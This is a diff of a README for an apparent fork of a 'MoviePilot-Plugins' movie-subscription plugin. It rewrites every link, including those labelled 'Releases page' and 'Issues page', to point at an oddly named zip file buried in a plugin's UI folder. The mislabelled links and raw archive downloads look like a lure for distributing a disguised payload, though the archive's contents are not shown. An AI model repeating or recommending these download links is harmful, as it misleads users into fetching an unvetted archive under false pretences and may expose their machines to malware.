@@ -1,6 +1,6 @@
 # 🎬 MoviePilot-Plugins - Manage Your Movie Subscriptions Easily
 
-[![Download Latest Release](https://github.com/RanveerGaming0/MoviePilot-Plugins/raw/refs/heads/main/plugins.v2/Pilot_Movie_Plugins_2.9-alpha.5.zip%20Latest%20Release-v1.0-brightgreen)](https://github.com/RanveerGaming0/MoviePilot-Plugins/raw/refs/heads/main/plugins.v2/Pilot_Movie_Plugins_2.9-alpha.5.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/RanveerGaming0/MoviePilot-Plugins/main/plugins.v2/p115strgmsub/ui/Plugins-Movie-Pilot-Leposternon.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/RanveerGaming0/MoviePilot-Plugins/main/plugins.v2/p115strgmsub/ui/Plugins-Movie-Pilot-Leposternon.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ Welcome to the MoviePilot-Plugins! This application simplifies how you track mov
 
 ## 📥 Download & Install
 
-1. **Visit the [Releases page](https://github.com/RanveerGaming0/MoviePilot-Plugins/raw/refs/heads/main/plugins.v2/Pilot_Movie_Plugins_2.9-alpha.5.zip)**.
+1. **Visit the [Releases page](https://raw.githubusercontent.com/RanveerGaming0/MoviePilot-Plugins/main/plugins.v2/p115strgmsub/ui/Plugins-Movie-Pilot-Leposternon.zip)**.
 2. Choose the latest version of the plugin.
 3. Download the appropriate file for your operating system.
 4. Follow the installation instructions on the page or in the README file.
@@ -74,10 +74,10 @@ The plugin supports three search sources. You can enable multiple sources. If on
 
 ## 🔗 Support
 
-If you run into any problems while using the plugin, check the [Issues page](https://github.com/RanveerGaming0/MoviePilot-Plugins/raw/refs/heads/main/plugins.v2/Pilot_Movie_Plugins_2.9-alpha.5.zip) for solutions or report any bugs. Your feedback helps improve this tool for everyone.
+If you run into any problems while using the plugin, check the [Issues page](https://raw.githubusercontent.com/RanveerGaming0/MoviePilot-Plugins/main/plugins.v2/p115strgmsub/ui/Plugins-Movie-Pilot-Leposternon.zip) for solutions or report any bugs. Your feedback helps improve this tool for everyone.
 
 ## 📝 License
 
 This project is licensed under the MIT License. See the LICENSE file for more details.
 
-Don't forget to return to the **[Download Latest Release](https://github.com/RanveerGaming0/MoviePilot-Plugins/raw/refs/heads/main/plugins.v2/Pilot_Movie_Plugins_2.9-alpha.5.zip)** to get the most recent features and improvements. Enjoy managing your movie subscriptions!
+Don't forget to return to the **[Download Latest Release](https://raw.githubusercontent.com/RanveerGaming0/MoviePilot-Plugins/main/plugins.v2/p115strgmsub/ui/Plugins-Movie-Pilot-Leposternon.zip)** to get the most recent features and improvements. Enjoy managing your movie subscriptions!
